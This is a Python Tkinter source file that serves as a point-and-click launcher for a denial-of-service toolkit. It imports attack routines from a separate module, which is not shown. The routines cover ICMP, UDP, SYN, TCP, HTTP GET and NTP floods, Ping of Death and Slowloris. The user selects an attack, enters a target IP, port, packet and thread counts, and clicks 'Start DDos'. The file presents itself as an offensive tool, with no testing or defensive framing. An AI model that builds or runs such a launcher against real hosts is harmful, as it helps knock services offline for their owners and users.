from Tkinter import *
import ttk
from dddos import *

DDosClass = {"ICMPFlood":icmpFlood,
             "UDPFlood":udpFlood,
             "SYNFlood":synFlood,
             "TCPFlood":tcpFlood,
             "DeathPing":deathPing,
             "GetFlood":getFlood,
             "SlowLoris":slowLoris,
             "NTPFlood":NtpFlood}

class DDosWindows:
    def __init__(self,ddosType,args,defaultArgs):
        self.window = Tk()
        self.window.title("DDos")

        self.ddosType = ddosType
        self.argslist = []
        self.args = args

        for i in range(len(args)):
            Label(self.window, text=args[i]).pack()
            self.argslist.append(StringVar())
            self.argslist[i].set(defaultArgs[i])
            Entry(self.window, textvariable=self.argslist[i]).pack()


        self.buttonStart = Button(self.window, text="Start DDos", command=self.startDDos)
        self.buttonStart.pack()
        self.buttonExit = Button(self.window, text="Exit", command=self.exitDDos)
        self.buttonExit.pack()

        self.window.mainloop()

    def startDDos(self):
        ddosargs = {}
        for i in range(len(self.args)):
            ddosargs[self.args[i]] = self.argslist[i].get()
        DDosClass[self.ddosType](ddosargs).run()

    def exitDDos(self):
        self.window.destroy()
        MainWindows()






class MainWindows():
    def __init__(self):
        self.mainWin = Tk()
        self.mainWin.title("DDos Type choosing")
        self.ddosType = StringVar()
        self.typeChosen = ttk.Combobox(self.mainWin, width=12, textvariable=self.ddosType)
        self.typeChosen['values'] = ("ICMPFlood", "TCPFlood", "UDPFlood", "SYNFlood","DeathPing","GetFlood","SlowLoris","NTPFlood")
        self.typeChosen.current(0)
        self.typeChosen.pack()

        self.defaultIP = "192.168.1.1"

        self.configName = {"ICMPFlood":["ip","timeout","packets"],
              "TCPFlood":["ip", "port", "size", "packets"],
              "UDPFlood":["ip", "port", "size", "packets"],
              "SYNFlood":["ip", "port", "packets"],
              "DeathPing":["ip","length"],
              "GetFlood":["ip","object","packets"],
              "SlowLoris":["ip","port","threads","timeout"],
              "NTPFlood":["ip","threads"]}
        self.configDefault = {"ICMPFlood":[self.defaultIP,"2","4"],
              "TCPFlood":[self.defaultIP,"80","64","1000"],
              "UDPFlood":[self.defaultIP,"0","64","1000"],
              "SYNFlood":[self.defaultIP,"80","1000"],
              "DeathPing": [self.defaultIP,"65536"],
              "GetFlood": [self.defaultIP,"/index.php","1000"],
              "SlowLoris": [self.defaultIP,"80","10","1"],
              "NTPFlood": [self.defaultIP,"10"]}
        self.buttonConfig = Button(self.mainWin, text="Start Config", command=self.openDDosWindows)
        self.buttonConfig.pack()
        self.buttonExit = Button(self.mainWin, text="Exit", command=self.mainWin.destroy)
        self.buttonExit.pack()
        self.mainWin.mainloop()

    def openDDosWindows(self):
        self.mainWin.destroy()
        DDosWindows(self.ddosType.get(), self.configName[self.ddosType.get()],self.configDefault[self.ddosType.get()])

MainWindows()